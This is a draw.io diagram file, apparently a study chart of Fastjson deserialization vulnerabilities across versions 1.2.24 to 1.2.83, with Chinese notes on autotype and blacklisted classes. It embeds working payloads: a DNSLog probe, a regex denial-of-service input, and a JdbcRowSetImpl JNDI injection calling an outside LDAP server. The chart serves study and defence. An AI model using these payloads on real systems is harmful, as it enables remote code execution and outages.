<mxfile host="app.diagrams.net" modified="2024-04-03T05:43:32.500Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" etag="XzU9WF14EMbDyO2pTJ7Q" version="24.2.0" type="github">
  <diagram name="第 1 页" id="BrHA03G-W_aIONTmGHqB">
    <mxGraphModel dx="2138" dy="1244" grid="1" gridSize="20" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="4681" pageHeight="3300" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-51" value="dnslog payload&lt;div style=&quot;font-size: 14px;&quot;&gt;&lt;div style=&quot;background-color: rgb(255, 255, 255); font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; line-height: 19px; white-space-collapse: preserve;&quot;&gt;{&lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;zero&quot;&lt;/span&gt;:{&lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;java.net.Inet4Address&quot;&lt;/span&gt;,&lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;val&quot;&lt;/span&gt;:&lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;dnslog.com&quot;&lt;/span&gt;}}&lt;/div&gt;&lt;/div&gt;" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;labelBackgroundColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="1300" y="900" width="500" height="60" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-65" value="autotype默认禁用" style="text;html=1;align=center;verticalAlign=middle;resizable=1;points=[];autosize=1;strokeColor=none;fillColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="600" y="580" width="140" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-100" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-121" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="480" y="640" as="sourcePoint" />
            <mxPoint x="2800" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-102" value="" style="endArrow=none;html=1;rounded=0;endFill=0;fontSize=14;" parent="1" target="WJFe8LfCxCwkPJLQWvTl-101" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="380" y="640" as="sourcePoint" />
            <mxPoint x="980" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-105" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=0;exitDx=0;exitDy=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-101" edge="1">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="599.6666666666667" y="560" as="targetPoint" />
            <Array as="points">
              <mxPoint x="600" y="590" />
              <mxPoint x="600" y="590" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-134" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-101" edge="1">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="599.666666666667" y="760" as="targetPoint" />
            <Array as="points">
              <mxPoint x="600" y="700" />
              <mxPoint x="600" y="700" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-101" value="1.2.24" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="560" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-123" value="" style="endArrow=none;html=1;rounded=0;fontSize=14;endFill=0;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-101" target="WJFe8LfCxCwkPJLQWvTl-110" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="640" y="640" as="sourcePoint" />
            <mxPoint x="2400" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-110" value="1.2.33" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="740" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-124" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-110" target="WJFe8LfCxCwkPJLQWvTl-112" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="830" y="640" as="sourcePoint" />
            <mxPoint x="2400" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-143" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-112" edge="1">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="959.666666666667" y="820" as="targetPoint" />
            <Array as="points">
              <mxPoint x="960" y="720" />
              <mxPoint x="960" y="720" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-112" value="1.2.36" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="920" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-125" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-166" target="WJFe8LfCxCwkPJLQWvTl-116" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1020" y="640" as="sourcePoint" />
            <mxPoint x="2400" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-116" value="1.2.47" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="1640" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-126" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-112" target="WJFe8LfCxCwkPJLQWvTl-113" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1020" y="640" as="sourcePoint" />
            <mxPoint x="1420" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-113" value="1.2.41" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="1100" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-129" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-113" target="WJFe8LfCxCwkPJLQWvTl-115" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1180" y="640" as="sourcePoint" />
            <mxPoint x="1730" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-115" value="1.2.44" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="1280" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-130" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-116" target="WJFe8LfCxCwkPJLQWvTl-118" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1720" y="640" as="sourcePoint" />
            <mxPoint x="2580" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-1" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;" edge="1" parent="1" source="WJFe8LfCxCwkPJLQWvTl-118">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="1859.666666666667" y="820" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-118" value="1.2.62" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="1820" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-131" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-169" target="WJFe8LfCxCwkPJLQWvTl-119" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1880" y="640" as="sourcePoint" />
            <mxPoint x="2580" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-119" value="1.2.72" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="2260" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-132" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-119" target="WJFe8LfCxCwkPJLQWvTl-122" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="2340" y="640" as="sourcePoint" />
            <mxPoint x="2860" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-122" value="1.2.80" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="2440" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-133" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-122" target="WJFe8LfCxCwkPJLQWvTl-121" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="2520" y="640" as="sourcePoint" />
            <mxPoint x="2860" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-168" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-121" edge="1">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="2659.666666666667" y="940" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-121" value="1.2.83" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="2620" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-136" value="未限制autotype" style="text;html=1;align=center;verticalAlign=middle;resizable=1;points=[];autosize=1;strokeColor=none;fillColor=none;labelBackgroundColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="470" y="580" width="140" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-145" value="" style="endArrow=classic;html=1;rounded=0;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-150" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="960" y="800" as="sourcePoint" />
            <mxPoint x="1860" y="800" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-147" value="&lt;div style=&quot;font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; letter-spacing: 0.544px; white-space: pre;&quot;&gt;{&lt;/div&gt;&lt;div style=&quot;font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; letter-spacing: 0.544px; white-space: pre;&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;regex&quot;&lt;/span&gt;:{&lt;/div&gt;&lt;div style=&quot;font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; letter-spacing: 0.544px; white-space: pre;&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;$ref&quot;&lt;/span&gt;:&lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;$[blue rlike &#39;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#39;]&quot;&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; letter-spacing: 0.544px; white-space: pre;&quot;&gt;&amp;nbsp; &amp;nbsp; },&lt;/div&gt;&lt;div style=&quot;font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; letter-spacing: 0.544px; white-space: pre;&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;blue&quot;&lt;/span&gt;:&lt;span style=&quot;color: rgb(163, 21, 21); font-size: 14px;&quot;&gt;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; letter-spacing: 0.544px; white-space: pre;&quot;&gt;}&lt;/div&gt;" style="whiteSpace=wrap;html=1;labelBackgroundColor=none;fontSize=14;align=left;" parent="1" vertex="1">
          <mxGeometry x="990" y="1330" width="580" height="120" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-151" value="" style="endArrow=none;html=1;rounded=0;endFill=0;" parent="1" target="WJFe8LfCxCwkPJLQWvTl-150" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="960" y="800" as="sourcePoint" />
            <mxPoint x="1660" y="800" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-154" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;dashed=1;curved=0;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-150" target="WJFe8LfCxCwkPJLQWvTl-147" edge="1">
          <mxGeometry relative="1" as="geometry">
            <Array as="points">
              <mxPoint x="1400" y="860" />
              <mxPoint x="1260" y="860" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-150" value="正则DDOS" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="1360" y="780" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-164" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.4;exitY=0.5;exitDx=0;exitDy=0;exitPerimeter=0;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-158" edge="1">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="2660" y="880" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-9" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.1;exitY=0.5;exitDx=0;exitDy=0;exitPerimeter=0;" edge="1" parent="1" source="6waAEHE7Pi9td4LNbUZB-11">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="600" y="700" as="targetPoint" />
            <Array as="points">
              <mxPoint x="480" y="700" />
            </Array>
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-158" value="" style="line;strokeWidth=2;direction=south;html=1;points=[[0,0.5,0,0,0],[0.1,0.5,0,0,0],[0.2,0.5,0,0,0],[0.3,0.5,0,0,0],[0.4,0.5,0,0,0],[0.5,0.5,0,0,0],[0.6,0.5,0,0,0],[0.7,0.5,0,0,0],[0.8,0.5,0,0,0],[0.9,0.5,0,0,0],[1,0.5,0,0,0]];dashed=1;dashPattern=1 4;" parent="1" vertex="1">
          <mxGeometry x="380" y="640" width="38" height="600" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-167" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-115" target="WJFe8LfCxCwkPJLQWvTl-166" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1360" y="640" as="sourcePoint" />
            <mxPoint x="1760" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-166" value="1.2.45" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="1460" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-170" value="" style="endArrow=classic;html=1;rounded=0;fontSize=14;" parent="1" source="WJFe8LfCxCwkPJLQWvTl-118" target="WJFe8LfCxCwkPJLQWvTl-169" edge="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1880" y="640" as="sourcePoint" />
            <mxPoint x="2120" y="640" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=0;exitDx=0;exitDy=0;" edge="1" parent="1" source="WJFe8LfCxCwkPJLQWvTl-169">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="2039.666666666667" y="560" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="WJFe8LfCxCwkPJLQWvTl-169" value="1.2.68" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" parent="1" vertex="1">
          <mxGeometry x="2000" y="620" width="80" height="40" as="geometry" />
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-6" value="java.lang.Runnable、java.lang.Readable、java.lang.AutoCloseable&lt;div&gt;加入黑名单&lt;/div&gt;" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" vertex="1" parent="1">
          <mxGeometry x="2060" y="540" width="160" height="80" as="geometry" />
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-8" value="&lt;div style=&quot;font-family: Consolas, &amp;quot;Courier New&amp;quot;, monospace; font-size: 14px; letter-spacing: 0.544px; white-space: pre;&quot;&gt;&lt;div style=&quot;letter-spacing: normal;&quot;&gt;&lt;div style=&quot;background-color: rgb(255, 255, 255); line-height: 19px;&quot;&gt;&lt;div&gt;{&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &lt;span style=&quot;color: #a31515;&quot;&gt;&quot;b&quot;&lt;/span&gt;:{&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;span style=&quot;color: #a31515;&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span style=&quot;color: #a31515;&quot;&gt;&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;span style=&quot;color: #a31515;&quot;&gt;&quot;dataSourceName&quot;&lt;/span&gt;:&lt;span style=&quot;color: #a31515;&quot;&gt;&quot;ldap://10.0.0.10:1389/srajuc&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;span style=&quot;color: #a31515;&quot;&gt;&quot;autoCommit&quot;&lt;/span&gt;: &lt;span style=&quot;color: #a31515;&quot;&gt;&quot;false&quot;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;/div&gt;&lt;div&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;" style="whiteSpace=wrap;html=1;labelBackgroundColor=none;fontSize=14;align=left;" vertex="1" parent="1">
          <mxGeometry x="300" y="1320" width="580" height="140" as="geometry" />
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-13" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.1;exitY=0.5;exitDx=0;exitDy=0;exitPerimeter=0;endArrow=none;endFill=0;" edge="1" parent="1" source="WJFe8LfCxCwkPJLQWvTl-158" target="6waAEHE7Pi9td4LNbUZB-11">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="600" y="700" as="targetPoint" />
            <mxPoint x="399" y="700" as="sourcePoint" />
            <Array as="points" />
          </mxGeometry>
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-14" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=0.5;exitY=1;exitDx=0;exitDy=0;entryX=0.5;entryY=0;entryDx=0;entryDy=0;dashed=1;curved=0;" edge="1" parent="1" source="6waAEHE7Pi9td4LNbUZB-11" target="6waAEHE7Pi9td4LNbUZB-8">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="6waAEHE7Pi9td4LNbUZB-11" value="payload" style="whiteSpace=wrap;html=1;fillColor=default;strokeColor=none;fontSize=14;" vertex="1" parent="1">
          <mxGeometry x="460" y="680" width="80" height="40" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
